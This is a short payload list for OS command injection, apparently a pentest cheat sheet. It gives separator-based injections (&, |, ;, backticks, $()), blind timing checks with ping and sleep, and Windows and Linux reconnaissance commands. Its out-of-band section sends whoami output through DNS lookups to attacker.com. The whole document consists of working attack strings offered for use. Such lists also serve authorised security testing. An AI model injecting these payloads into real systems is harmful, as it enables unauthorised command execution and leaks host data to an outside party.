# Payload Collection

## Basic

& whoami &

&& whoami &&

| whoami

|| whoami

---

## Unix

; whoami ;

`whoami`

$(whoami)

---

## Blind

& ping -c 10 127.0.0.1 &

& sleep 10 &

---

## OAST

& nslookup attacker.com &

& nslookup $(whoami).attacker.com &

& nslookup `whoami`.attacker.com &

---

## Windows

& whoami &

& hostname &

& ipconfig /all &

---

## Linux

& id &

& uname -a &

& hostname &